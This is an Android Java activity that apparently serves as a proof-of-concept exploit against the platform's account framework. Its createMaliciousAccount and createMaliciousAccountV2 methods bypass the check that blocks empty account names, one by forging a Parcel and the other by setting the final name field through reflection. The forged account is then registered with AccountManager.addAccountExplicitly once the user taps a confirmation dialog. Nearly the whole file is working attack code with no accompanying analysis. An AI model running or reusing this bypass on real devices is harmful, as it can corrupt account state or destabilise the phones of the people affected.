package dev.virtualpatch.shiva;

import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;
import android.view.View;

import java.lang.reflect.Field;

public class MainActivity extends AppCompatActivity {

    private static String ACC_TYPE = "dev.virtualpatch";

    public void listAccounts(View view) {
        try {
            AccountManager am = AccountManager.get(this);
            Account[] accounts = am.getAccountsByType(ACC_TYPE);
            for(Account acc: accounts) {
                Log.v("ACCOUNT", acc.toString());
            }
        } catch(Exception e) {
            Log.e("ACCOUNT", "error listing accounts: " + e.toString());
            e.printStackTrace();
        }
    }

    private interface OnConfirmHandler {
        void onConfirm();
    }

    private static final String T = "VirtualPatch";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    public void onButtonClick(View _) {
        Account acc;
        try {
            acc = createMaliciousAccountV2();
        } catch (Exception e) {
            Log.v(T, "cannot create account with empty name");
            dialog(R.string.message_error);
            return;
        }
        try {
            MainActivity thiz = this;
            dialog(R.string.message_confirm, new OnConfirmHandler() {
                @Override
                public void onConfirm() {
                    AccountManager m = AccountManager.get(thiz);
                    m.addAccountExplicitly(acc, null, null);
                    dialog(R.string.message_success);
                }
            });
        } catch(Exception e) {
            // nothing to do, the account has been added
            e.printStackTrace();
        }
    }

    private void dialog(int msg) {
        dialog(msg, null);
    }

    private void dialog(int msg, OnConfirmHandler h)
    {
        AlertDialog.Builder b = new AlertDialog.Builder(this)
                .setMessage(msg)
                .setPositiveButton(R.string.ok, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialogInterface, int i) {
                        if(h != null) {
                            h.onConfirm();
                        }
                        dialogInterface.dismiss();
                    }
                });
        if(h != null) {
            b.setNegativeButton(R.string.cancel, new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialogInterface, int i) {
                    dialogInterface.dismiss();
                }
            });
        }
        //AlertDialog d = b.create();
        Log.v("DIALOG", "before show");
        b.show();//d.show();
        Log.v("DIALOG", "after show");
    }

    private Account createMaliciousAccount() {
        Parcel p = Parcel.obtain();
        p.writeString("");
        p.writeString(ACC_TYPE);
        p.writeString(null);
        p.setDataPosition(0);
        Account acc = new Account(p);
        p.recycle();
        return acc;
    }

    private Account createMaliciousAccountV2() throws NoSuchFieldException, IllegalAccessException {
        Account acc = new Account("name", ACC_TYPE);
        Field name = Account.class.getField("name");
        name.setAccessible(true);
        name.set(acc, "");
        return acc;
    }
}